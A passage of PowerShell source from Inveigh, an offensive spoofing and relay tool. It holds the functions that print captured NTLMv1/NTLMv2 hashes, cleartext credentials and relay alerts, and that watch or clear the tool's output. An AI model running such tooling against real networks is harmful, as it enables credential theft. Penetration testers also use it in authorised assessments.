    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($Console -or $PSBoundParameters.Count -eq 0)
{

    while($inveigh.console_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
            $inveigh.console_queue.RemoveAt(0)
        }
        else
        {

            switch -wildcard ($inveigh.console_queue[0])
            {

                "* written to *"
                {

                    if($inveigh.file_output)
                    {
                        Write-Warning $inveigh.console_queue[0]
                    }

                    $inveigh.console_queue.RemoveAt(0)
                }

                "* for relay *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                "*SMB relay *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                "* local administrator *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

            }

        }
         
    }

}

if($Log)
{
    Write-Output $inveigh.log
}

if($NTLMv1)
{
    Write-Output $inveigh.NTLMv1_list
}

if($NTLMv1Unique)
{
    $inveigh.NTLMv1_list.Sort()

    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
    {
        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
        {
            Write-Output $unique_NTLMv1
        }

        $unique_NTLMv1_account_last = $unique_NTLMv1_account
    }

}

if($NTLMv1Usernames)
{
    Write-Output $inveigh.NTLMv2_username_list
}

if($NTLMv2)
{
    Write-Output $inveigh.NTLMv2_list
}

if($NTLMv2Unique)
{
    $inveigh.NTLMv2_list.Sort()

    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
    {
        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
        {
            Write-Output $unique_NTLMv2
        }

        $unique_NTLMv2_account_last = $unique_NTLMv2_account
    }

}

if($NTLMv2Usernames)
{
    Write-Output $inveigh.NTLMv2_username_list
}

if($Cleartext)
{
    Write-Output $inveigh.cleartext_list
}

if($CleartextUnique)
{
    Write-Output $inveigh.cleartext_list | Get-Unique
}

if($Learning)
{
    Write-Output $inveigh.valid_host_list
}

}

function Watch-Inveigh
{
<#
.SYNOPSIS
Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.
#>

if($inveigh.tool -ne 1)
{

    if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
    {
        Write-Output "Press any key to stop real time console output"
        $inveigh.console_output = $true

        :console_loop while((($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                if($inveigh.output_stream_only)
                {
                    Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                    $inveigh.console_queue.RemoveAt(0)
                }
                else
                {

                    switch -wildcard ($inveigh.console_queue[0])
                    {
                          
                        "* written to *"
                        {

                            if($inveigh.file_output)
                            {
                                Write-Warning $inveigh.console_queue[0]
                            }

                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "* for relay *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "*SMB relay *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "* local administrator *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        default
                        {
                            Write-Output $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                    }

                }
                             
            }

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "Inveigh isn't running"
    }

}
else
{
    Write-Output "Watch-Inveigh cannot be used with current external tool selection"
}

}

function Clear-Inveigh
{
<#
.SYNOPSIS
Clear-Inveigh will clear Inveigh data from memory.
#>

if($inveigh)
{

    if(!$inveigh.running -and !$inveigh.relay_running -and !$inveigh.unprivileged_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "Run Stop-Inveigh before running Clear-Inveigh"
    }

}

}